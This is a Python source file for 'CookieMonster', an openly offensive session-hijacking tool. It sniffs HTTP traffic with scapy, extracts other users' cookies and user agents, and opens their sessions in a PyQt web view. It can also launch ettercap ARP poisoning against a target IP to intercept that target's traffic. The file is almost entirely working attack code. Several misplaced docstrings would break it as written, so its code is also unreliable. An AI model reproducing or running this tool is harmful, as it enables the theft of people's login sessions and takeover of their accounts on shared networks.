#!/usr/bin/python
# -*- coding: iso-8859-1 -*-
#this bitch is GPL

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys, subprocess, urllib, time
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4.QtWebKit import *
from PyQt4.QtNetwork import *
import thread
from multiprocessing import Queue, Pipe, Process
import getopt


class CookieMonster:
	"""docstring for CookieMonster"""
	filename = False
	interface = False
	arp_target = False

	attacked = set()
	cookies = []
	parent_conn = None
	
	def __init__(self, filename, interface, arp_target):
		#super(CookieMonster, self).__init__()
		self.filename = filename
		self.interface = interface
		self.arp_target = arp_target
		self.my_ip = str(IP(dst="www.google.com").src)
		if filename:
			print " [info] reading packets in " +filename
		if interface:
			print " [info] IP address on "+interface+" is set to "+self.my_ip
			print " [info] Listening for HTTP traffic on "+interface
	
	def extractheader(self, data, header):
	
		for line in data.split("\n"):
			if line.startswith(header): #and (line.endswith("\r") or line.endswith("\n")):
				line = line.strip()
				line = line.split("GET")[0]
				line = line.split("POST")[0]
				return line[len(header+": "):]
		return False

	def ontothosepackets(self, pkt):
'''@todo: if we want to use a TableWidget to contain the cookies, the CookieMonster class may have to be a QObject to emit signals'''
		if not "IP" in pkt:
			print "no IP!"
			print ls(pkt.payload)
			return

		if not TCP in pkt:
			return

		data = str(pkt['TCP'].payload)
		
		if (len(data.split("Cookie"))<1): return

		host = self.extractheader(data, "Host")
		cookie = self.extractheader(data, "Cookie")
		source = str(pkt['IP'].src)
		useragent = self.extractheader(data,"User-Agent")		
		
		if host and cookie and self.my_ip != source:
			print "Cookie found"
			self.attack(source, host, cookie, useragent)
		return
	
	
	def printcookiejar(self):
		olddomain = ""
		print " [info] cookiejar so far ======================================\n"
		for cookie in self.cookies:
			if (cookie.domain() != olddomain): 
				print " \n  for domain: " + cookie.domain()
				olddomain = cookie.domain()
			print "\t cookiename: " + cookie.name()
		print "\n\n =============================================================="
	
	def extractcookie(self, rawcookie, cookiename):
		'''@attention: this function isn't actually used???'''
		for i in rawcookie.split(";"):
			i = i.strip()
			if i.startswith(cookiename):
				return "=".join(i.split("=")[1:])
		return False
	
	def attack(self, source, host, rawcookies, useragent):
		
		
		# website already attacked -> abort
		if (source, host) in self.attacked: return
		
		self.attacked.add((source, host))
		
		print "\n [!]  "+source+" is sending cookies to "+host+"... "
		
		domain = host.split(".")[-2:]
		if domain[0] == "com":
			domain = ".".join(host.split(".")[-3:])
		else:
			domain = ".".join(host.split(".")[-2:])

		#adding cookies to cookiejar
		for cookie in rawcookies.split("; "):
			qnc = QNetworkCookie()
			website = host.split(".")
			qnc.setDomain("."+domain)
			key = cookie.split("=")[0]
			value = "=".join( cookie.split("=")[1:] )
			qnc.setName(key)
			qnc.setValue(value)
			self.cookies.append(qnc)
	
		#starting thread
		parent_conn, child_conn = Pipe()
		
		p = Process(target=self.open_web, args=(child_conn,self.cookies))
		p.start()
		parent_conn.send((domain, rawcookies, useragent))
		
		#debugging purposes
		#self.printcookiejar()

		return


	

	def inthemiddle(self):
		
		ettercap_command = "ettercap -oD -M arp:remote /"+str(self.arp_target)+"/ -i " + self.interface
		os.popen(ettercap_command)
		return
	

	def sortfun(self, a, b):
		return cmp(a.seq%(2**32), b.seq%(2**32))
	
	def handlepkt(self, pkt):
		self.ontothosepackets(pkt)
	
'''@todo: handle internal links, see 
http://stackoverflow.com/questions/6951199/qwebview-doesnt-open-links-in-new-window-and-not-start-external-application-for 
by flankerhqd017@gmailc.om''' 
	def open_web(self, child_conn, cookiejar):
		app = QApplication(sys.argv)
		wind = QMainWindow()
		view = QWebView()
		nam = QNetworkAccessManager()
		view.page().setNetworkAccessManager(nam)

		host, freshcookies, useragent = child_conn.recv()
		print " [!]  Spawning web view of " + host
		############## DEBUG		
		self.printcookiejar()
		ncj = QNetworkCookieJar()
		ncj.setAllCookies(self.cookies)
		nam.setCookieJar(ncj)

		qnr = QNetworkRequest(QUrl("http://"+host))
		qnr.setRawHeader("User-Agent",useragent)

		view.load(qnr)
		wind.setCentralWidget(view)
		wind.show()
		wind.setWindowTitle("Cookie Of "+host)	
		app.exec_()
'''@todo: maybe we can let user specify more ports to listen on '''
	def sniff(self):
		if self.filename:
			sniff(offline=self.filename, prn=self.handlepkt,filter="tcp port http", store=0)
		elif self.interface:
			if self.arp_target:
				self.inthemiddle()
			sniff(self.interface, prn=self.handlepkt,filter="tcp port http", store=0)
		


def usage():
	print """
Usage: python cookiemonster.py [options] [capture source]

Options:
	-a  --arp <IP>		Perform ARP poisoning on IP (in progress)

File / Interface
	-i --interface <interface>	Choose specified interface
	-f --file <filename> 		Choose specified filename
		
	"""
def validateIP(ipAddress):
	ipRegex = r"^([01]?\d\d?|2[0-4]\d|25[0-5])\.([01]?\d\d?|2[0-4]\d|25[0-5])\.([01]?\d\d?|2[0-4]\d|25[0-5])\.([01]?\d\d?|2[0-4]\d|25[0-5])$"
	re_ip = re.compile(ipRegex)
	return re_ip.match(ipAddress)

			
def getArguments(argv):
	try:
		opts, args = getopt.getopt(argv, "a:i:f:", ["arp=", "interface=", "file="])
	except getopt.GetoptError:
		usage()
		sys.exit(2)	
		
	check = False
	
	filename = False
	interface = False
	arp_target = False
	
	for opt, args in opts:	
			if opt in ("-f", "--file"):
				filename = args
				
			if opt in ("-i", "--interface"):
				interface = args
			
			if opt in ("-a", "--arp"):
				arp_target = args
				if not validateIP(args):
					print "Please enter a valid IP address"
					sys.exit(2)
					
	if not interface and not filename:
		usage()
		sys.exit(2)
	if interface and filename:
		print "ERROR: You cannot specify a filename AND an interface"
		usage()
		sys.exit(2)
		
		
	Monster = CookieMonster(filename, interface, arp_target)
	
	Monster.sniff()



if __name__=="__main__":
	
	getArguments(sys.argv[1:])
	
